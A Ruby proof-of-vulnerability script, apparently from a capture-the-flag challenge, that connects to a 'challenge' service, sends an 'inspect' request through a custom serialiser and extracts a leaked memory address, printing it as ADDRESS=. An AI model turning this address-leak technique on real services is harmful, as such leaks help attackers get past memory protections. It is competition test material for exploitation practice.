#!/usr/bin/env ruby

require "logger"
require "socket"
require "timeout"

require_relative "oqtopus"

LENGTH_RANGE=(100..200)
DEFAULT_TIME_LIMIT = 5

DATA_LOAD_RANGE=(10..20)

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end,
                 level: Logger::DEBUG)

if ENV['LOGGER_MIN_LEVEL']
  LLL.level = Logger.const_get(ENV['LOGGER_MIN_LEVEL'])
end

class Pov
  attr_reader :host, :port

  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = (ENV['PORT'] || 3015).to_i

    pick_timeout!
  end

  def run!
    @sock = TCPSocket.new @host, @port

    Timeout.timeout(@timeout) do
      got = evaluate ["inspect".k,
                      "+".k]
      unless md = /\(0x(\w+)\)/.match(got)
        LLL.fatal "Expected address, got #{got.inspect}"
        exit -1
      end
      $stdout.puts "ADDRESS=#{md[1]}"
    end
  end

  private

  def evaluate(statement)
    oqtopus_statement = statement.to_oqtopus
    # LLL.info oqtopus_statement.inspect
    @sock.write oqtopus_statement
    Oqtopus.read @sock
  end

  def pick_timeout!
    @timeout = (ENV['TIMEOUT'] || DEFAULT_TIME_LIMIT).to_i
    $stdout.puts "TIMEOUT=#{@timeout}"
    $stdout.flush
  end
end

pov = Pov.new
pov.run!
